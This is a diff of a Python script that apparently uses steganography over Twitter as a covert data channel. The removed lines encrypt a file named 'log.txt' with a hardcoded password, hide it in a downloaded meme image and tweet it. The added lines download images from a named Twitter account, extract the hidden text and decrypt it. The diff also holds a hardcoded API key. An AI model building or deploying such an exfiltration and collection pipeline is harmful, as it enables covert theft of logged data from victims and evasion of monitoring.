@@ -52,44 +52,6 @@ def updateConfig():
     #TODO update configuration file
     pass
 
-def DownloadTrendingImages():
-    API_KEY = "c4b739c3-442e-49c2-ac44-f5ad6b0e37e3"
-    headers = {'Content-Type': 'application/json'}
-    api_url = "http://version1.api.memegenerator.net//Generators_Select_ByTrending?apiKey=" + API_KEY    
-    response = requests.get(api_url, headers=headers)
-
-    if response.status_code == 200:
-        content = json.loads(response.content.decode('utf-8'))
-        return content["result"]
-    else:
-        return None
-
-def getImage():
-    ImageSize = "600x600" 
-    ImageSet = DownloadTrendingImages()
-    ImageSet_Size = len(ImageSet)
-
-    #get one image
-    if ImageSet_Size >= 1:
-        Image = random.choice(ImageSet)
-    else:
-        #No image not returned
-        Image = None
-
-    #image url
-    url = Image["imageUrl"]
-    index_of_last_slash = url.rfind("/")
-    url = url[:index_of_last_slash+1] + ImageSize + "/" + url[index_of_last_slash+1:]
-
-    response = requests.get(url)
-    if response.status_code == 200:
-        content = response.content
-        #return JPEG file
-        return PIL.Image.open(BytesIO(content))
-    else:
-        return None
-
-
 #hide message into image
 def stenographizeImage(ImagePath,NewImagePath,Text):
     secret_image = lsb.hide(ImagePath,message=Text)
@@ -122,6 +84,14 @@ def decrypt(password, encrypted_file, logged_file):
     except Exception as e:
         print(e)
 
+# Setup dir structure
+def setup_dir():
+    if not os.path.exists("temp"):
+        os.mkdir("temp")
+    if not os.path.exists("data"):
+        os.mkdir("data")
+
+# Delete temp files
 def cleanup(files):
     for eaFile in files:
         if os.path.exists(eaFile):
@@ -138,46 +108,60 @@ def tweetSetup():
     auth.set_access_token(access_token, access_token_secret)
     return tweepy.API(auth)
 
-def tweetImage(tw_api, image_path, tw_text="I love lemons"):
-    im_handler = tw_api.media_upload(image_path)
-    media_ids = [im_handler.media_id_string]
-    status = tw_api.update_status(tw_text, media_ids=media_ids)
+def getTweets(tw_api, image_path, data_path):
+    username = "Lemon12776532"
+    tweets = tw_api.user_timeline(username, count=10)
+    new_tweets_id = []
+    new_tweets_media = []
+    for tweet in tweets:
+        tweet_data = tweet._json
+        # Use id as filename (so there are no duplicates)
+        tw_id = tweet_data["id"]
+        tw_media = tweet_data["entities"]["media"][0]["media_url"]
+
+        if not os.path.exists(data_path.format(tw_id)):
+            new_tweets_id.append(tw_id)
+            new_tweets_media.append(tw_media)
+    return (new_tweets_id, new_tweets_media)
 
 def main():
+    setup_dir()
 
-    """
-    Image size of 600x600 = 360,000 pixels
-    Each byte of ASCII character can be encoded into 3 pixels
-    Bytes of ascii = 360,000 / 3 = 120,000 bytes
-    120,000 bytes = 117kB of text into image
-
-    Gets image from meme generator
-
-    """
-    image_name = "test_image"
-    ImagePath = './{}.png'.format(image_name)
-    NewImagePath = './{}_new.png'.format(image_name)
-
-    JPEG_IMG = getImage()
-    JPEG_IMG.save(ImagePath)
-    PNG_IMAGE = PIL.Image.open(ImagePath)
-    width, height = PNG_IMAGE.size
-    image_text_storage = (width * height)//3 #number of ASCII character that is storable
-
-    logged_file = "log.txt"
-    encrypted_file = "encrypted.txt"
+    image_path = './data/{}.png'
+    data_path = './data/{}.txt'
     password = "password"
 
-    encrypt(password, logged_file, encrypted_file)
+    tw_api = tweetSetup()
+    new_tweets = getTweets(tw_api, image_path, data_path)
 
-    with open(encrypted_file,'rb') as encrypted_text:
-        message = str(encrypted_text.read())
-        if image_text_storage > len(message):
-            stenographizeImage(ImagePath,NewImagePath,message)
-            tw_api = tweetSetup()
-            tweetImage(tw_api, NewImagePath)
+    tweet_ids = new_tweets[0]
+    tweet_medias = new_tweets[1]
 
-    files = [ImagePath, NewImagePath, logged_file, encrypted_file]
-    cleanup(files)
+    for idx in range(len(tweet_ids)):
+        tweet_id = tweet_ids[idx]
+        tweet_media = tweet_medias[idx]
+        
+        # Save image from url
+        image = requests.get(tweet_media)
+        cur_image_path = image_path.format(tweet_id)
+        PIL.Image.open(BytesIO(image.content)).save(cur_image_path)
+
+        # Data file paths
+        logged_file = data_path.format(tweet_id)
+        encrypted_file = data_path.format(str(tweet_id) + "_enc")
+
+        # Save message to file
+        enc_message = deStenographizeImage(cur_image_path)
+        file_enc = open(encrypted_file, 'w')
+        file_enc.write(enc_message);
+        file_enc.close();
+
+        # Decrypt
+        decrypt(password, encrypted_file, logged_file)
+
+        # Cleanup
+        files = [encrypted_file, image_path]
+        cleanup(files)
+
 
 main()
